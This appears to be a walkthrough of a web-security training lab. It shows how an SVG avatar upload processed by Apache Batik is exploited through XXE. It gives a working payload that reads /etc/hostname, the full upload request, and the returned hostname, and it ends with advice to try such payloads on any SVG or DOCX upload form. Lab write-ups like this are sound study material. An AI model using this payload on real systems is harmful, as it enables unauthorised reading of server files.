---
tags:
  - xxe
  - file-upload
---
# Exploiting XXE via image file upload

## Instructions

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

## Solution

Note that on this lab, each blog post has a file upload functionality in the comments section where a user can upload an avatar image. 

![](attachments/xxe-lab-8/file-20251121082956038.png)

We can use the following payload to create an svg image the will include the content of the /etc/hostname file as text in the image. Put this in a file and name it image.svg

```text title="image.svg"
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Now we can just upload that image as an avatar on a blog post comment.

```text title="Uploading the svg image"
POST /post/comment HTTP/1.1
Host: 0ac50066032ed70f8050a3b600560089.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Length: 1219
Origin: https://0ac50066032ed70f8050a3b600560089.web-security-academy.net
Connection: keep-alive
Referer: https://0ac50066032ed70f8050a3b600560089.web-security-academy.net/post?postId=4
Cookie: session=F2VyadhnGPtL5393C7Rts4URNliCJQTh
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: orange
Priority: u=0, i

------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="csrf"

sDBrnHtS5qphrN9aLtImJ1lo871ysPwn
------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="postId"

4
------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="comment"

Test comment
------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="name"

Tester1
------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="avatar"; filename="image.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="email"

tester1@test.com
------geckoformboundarya9d222b803c73cad101ae7c9d83a2213
Content-Disposition: form-data; name="website"


------geckoformboundarya9d222b803c73cad101ae7c9d83a2213--

```

Going back to the post, we see that our image has been uploaded successfully, and there is indeed text in the image. 

![](attachments/xxe-lab-8/file-20251121082956045.png)

Open the avatar image in a new tab to read the hostname.

![](attachments/xxe-lab-8/file-20251121082956046.png)

In this case, the hostname is 

```text title="Hostname"
52192edaa4ae
```

Submit this hostname to solve the lab.

## Lesson learned

Always check to see what file types are allowed on any upload form. If they allow SVG or DOCX, try to include an XXE payload.